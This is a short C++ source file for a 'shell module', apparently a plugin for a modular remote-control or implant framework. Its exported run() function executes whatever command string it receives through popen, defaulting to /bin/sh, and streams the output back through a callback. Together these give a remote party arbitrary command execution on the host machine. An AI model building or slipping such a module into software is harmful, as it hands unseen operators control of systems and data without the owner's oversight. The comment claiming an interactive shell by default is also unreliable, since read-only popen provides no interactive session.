
#include <iostream>
#include <vector>
#include <string>
#include <functional>
#include <cstdio>

// --- Module Callback Type ---
using module_callback_t = std::function<void(const std::vector<char>&)>;

// --- Shell Module ---

extern "C" void run(const std::vector<char>& data, module_callback_t send_output) {
    std::string command(data.begin(), data.end());
    if (command.empty()) {
        command = "/bin/sh"; // Default to an interactive shell if no command given
    }
    
    std::cout << "[SHELL] Executing command: " << command << std::endl;

    FILE* pipe = popen(command.c_str(), "r");
    if (!pipe) {
        std::string error = "Failed to execute command.";
        send_output(std::vector<char>(error.begin(), error.end()));
        return;
    }

    char buffer[256];
    while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
        std::string line(buffer);
        send_output(std::vector<char>(line.begin(), line.end()));
    }

    pclose(pipe);
    
    std::string end_msg = "[SHELL] Command execution finished.";
    send_output(std::vector<char>(end_msg.begin(), end_msg.end()));
}
